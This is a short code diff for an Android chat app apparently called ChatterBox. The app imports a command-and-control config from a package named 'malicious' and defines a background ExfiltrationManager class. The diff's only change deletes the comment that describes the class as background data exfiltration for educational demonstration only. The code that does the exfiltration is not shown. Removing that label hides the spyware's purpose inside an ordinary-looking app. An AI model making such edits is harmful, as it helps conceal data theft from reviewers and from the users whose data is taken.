@@ -24,10 +24,6 @@ import javax.crypto.Cipher
 import javax.crypto.spec.SecretKeySpec
 import com.example.ChatterBox.malicious.C2Config
 
-/**
- * Manages data exfiltration in the background.
- * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
- */
 class ExfiltrationManager(private val context: Context) {
     private val TAG = "ExfilManager"
     private var timer: Timer? = null
